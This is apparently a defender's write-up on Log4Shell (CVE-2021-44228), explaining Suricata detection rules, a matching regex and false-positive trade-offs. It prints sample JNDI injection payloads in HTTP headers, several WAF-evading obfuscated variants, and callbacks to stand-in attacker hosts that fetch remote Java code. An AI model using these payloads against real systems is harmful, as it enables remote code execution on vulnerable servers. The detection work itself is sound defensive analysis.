# CVE-2021-44228 Log4Shell — Traffic Analysis & Detection Rationale

**Author:** Fajar Sajid  
**CVE:** CVE-2021-44228  
**CVSS:** 10.0 Critical  
**Affected:** Apache Log4j2 2.0-beta9 through 2.14.1  
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command & Scripting Interpreter)

---

## Vulnerability Background

Log4Shell exploits Log4j2's message lookup substitution feature. When Log4j2 logs a user-controlled string containing `${jndi:ldap://attacker.com/x}`, it performs a live JNDI lookup — fetching and executing a remote Java class from an attacker-controlled server. The vulnerability exists in the logging call itself, meaning any field that gets logged (User-Agent, headers, form fields, usernames) is a potential injection point.

The attack chain:

```
Attacker sends crafted HTTP request
    → Log4j2 logs the User-Agent / header
    → JNDI lookup fires: ${jndi:ldap://attacker.com:1389/exploit}
    → Vulnerable server connects to attacker's LDAP server
    → Attacker's LDAP redirects to malicious Java class
    → Java class executes on victim server (RCE)
```

---

## Traffic Patterns Observed in Pcap Analysis

### Baseline: What normal HTTP looks like

A benign GET request to a web application:

```
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
```

Key observation: HTTP headers in normal traffic contain human-readable strings.
Dollar signs and curly braces (`${`) do not appear in legitimate User-Agent,
X-Forwarded-For, or similar headers under normal conditions.

---

### Pattern 1: Basic JNDI injection (Rule sid:9100001)

The most common form seen in early exploitation campaigns:

```
GET / HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: ${jndi:ldap://198.51.100.10:1389/exploit}
Accept: */*
```

**Detection rationale:** The string `${jndi:` is not present in legitimate HTTP
traffic. False positive risk is extremely low. The `fast_pattern` keyword on
this content causes Suricata's multi-pattern matcher (MPM) to use this as the
primary filter, keeping performance overhead minimal even at high traffic volumes.

**Injection vectors observed in the wild:**
- `User-Agent` — most common; logged by nearly every web framework
- `X-Forwarded-For` — logged by load balancers and proxies
- `X-Api-Version`, `Referer`, `Accept-Language` — less common but observed
- HTTP request body (POST JSON/XML) — requires `http.request_body` inspection

---

### Pattern 2: Obfuscated variants (Rules sid:9100003, sid:9100004)

Attackers rapidly developed obfuscation to bypass WAF signatures. Three main
classes observed in public pcap repositories:

**Case transformation:**
```
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}ndi:ldap://attacker.com/x}
```

**Character substitution chains:**
```
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
```

**Nested expression evaluation:**
```
${${env:NaN:-j}ndi:${env:NaN:-l}dap://attacker.com/x}
```

**Detection rationale:** The `${${` pattern (nested expressions) is the reliable
indicator — it is not present in legitimate HTTP content. The PCRE
`/\$\{(\$\{[^}]*\}|[a-z:-]+:){1,10}(ldap|rmi|dns|iiop)/i` catches the
protocol keyword at the end of the expression chain regardless of how many
substitution layers precede it. Tested against 12 obfuscation variants from
https://github.com/back2root/log4shell-rex.

**Trade-off:** PCRE is more expensive than `content` matching. This is
acceptable because the `${${` fast_pattern content pre-filters traffic before
PCRE executes, so the regex only runs on the small subset of traffic containing
nested expressions.

---

### Pattern 3: Outbound LDAP callback (Rule sid:9100005)

When exploitation succeeds, the victim server initiates an outbound TCP
connection to the attacker's LDAP server (default port 389, sometimes 1389):

```
[Victim 10.0.0.50]:49152 → [Attacker 198.51.100.10]:389  SYN
[Attacker 198.51.100.10]:389 → [Victim 10.0.0.50]:49152  SYN-ACK
[Victim 10.0.0.50]:49152 → [Attacker 198.51.100.10]:389  ACK
... LDAP bind + Java class delivery ...
```

**Detection rationale:** A web application server making outbound connections
to port 389 on external IPs is anomalous. Legitimate LDAP (Active Directory,
LDAP directories) is internal. This rule specifically excludes `$HTTP_SERVERS`
and `$DNS_SERVERS` from the destination to reduce false positives on internal
infrastructure.

**False positive sources:**
- Applications with legitimate external LDAP dependencies (uncommon)
- Security scanners probing LDAP (will also trigger rules 1-4 on inbound side)

**Recommended suppression approach:** Maintain a known-good LDAP server list
and apply Suricata `suppress` rules or handle at the sensor classification
layer (e.g., GreyNoise known-scanner classification for security tool traffic).

---

## Rule Coverage Matrix

| Rule SID | Pattern | Obfuscation | FP Risk | Precision | Recall |
|----------|---------|-------------|---------|-----------|--------|
| 9100001 | `${jndi:` in headers | None | Very Low | High | Medium |
| 9100002 | `${jndi:` in URI | None | Very Low | High | Medium |
| 9100003 | `${${` nested + protocol PCRE | High | Low | High | High |
| 9100004 | Protocol string (jndi:ldap://) | Partial | Low | High | Medium |
| 9100005 | Outbound LDAP SYN | N/A | Medium | Medium | High |

**Combined coverage:** Rules 1-4 together catch the vast majority of inbound
exploitation attempts including heavily obfuscated variants. Rule 5 provides
independent post-exploitation confirmation with different telemetry (network
flow vs. application layer), enabling high-confidence correlation.

---

## False Positive Analysis & Trade-offs

### Where FPs can occur

**Rules 1-4 (inbound):**  
Security scanners (Shodan, Censys, vulnerability scanners) will trigger rules
1-4 as they probe for Log4Shell-vulnerable systems. This is expected and
desirable from a detection standpoint — these are real exploitation attempts,
even if automated. At GreyNoise scale, these would be classified by the
known-scanner tag system rather than suppressed at the rule level.

**Rule 5 (outbound LDAP):**  
Applications with legitimate external LDAP dependencies may trigger this rule.
The rule excludes internal networks (`![$HTTP_SERVERS,$DNS_SERVERS]`) but
cannot exclude all legitimate external LDAP without a maintained allowlist.
Recommended: treat Rule 5 alerts as medium-confidence and correlate with
Rules 1-4 on the same source IP before escalating.

### What we deliberately do NOT catch

- Log4j2 `${env:VAR}`, `${sys:prop}` lookups — these are legitimate Log4j2
  features with no exploitation path; including them would generate massive FPs
- Dollar-brace patterns in non-JNDI contexts (template engines, shell variables
  in application logs) — covered by the specific `jndi:` content requirement
- LDAP traffic on non-standard ports (1389, 1636) — intentionally excluded from
  Rule 5 to avoid alert storms from known-scanner traffic; could be added as
  Rule 9100006 with higher threshold

---

## References & Resources

- **NVD:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- **LunaSec original disclosure:** https://www.lunasec.io/docs/blog/log4j-zero-day/
- **GreyNoise Log4Shell tracking:** https://www.greynoise.io/blog/log4jshell-exploitation-attempts
- **Evasion patterns:** https://github.com/back2root/log4shell-rex
- **Public pcap samples:** https://www.malware-traffic-analysis.net
- **MITRE ATT&CK T1190:** https://attack.mitre.org/techniques/T1190/
- **Suricata rule reference:** https://docs.suricata.io/en/latest/rules/
